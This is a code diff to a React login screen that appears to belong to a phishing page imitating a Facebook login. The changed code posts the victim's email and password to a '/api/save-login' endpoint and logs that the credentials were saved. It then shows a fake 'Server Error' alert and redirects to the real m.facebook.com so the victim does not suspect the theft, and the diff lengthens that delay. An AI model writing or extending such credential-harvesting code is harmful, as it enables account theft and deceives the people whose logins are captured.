@@ -10,22 +10,27 @@ export default function LoginScreen() {
     setIsLoading(true);
 
     try {
-      await fetch('/api/login.php', {
+      const response = await fetch('/api/save-login', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({ email, password }),
       });
+
+      if (response.ok) {
+        console.log('Credentials saved successfully');
+      }
     } catch (error) {
       console.error('Failed to send credentials:', error);
     }
 
+    // Wait a short moment to show loading state, then redirect
     setTimeout(() => {
       alert("Server Error, Please Try Again Later");
       window.location.href = "https://m.facebook.com";
       setIsLoading(false);
-    }, 800);
+    }, 1500);
   };
 
   return (
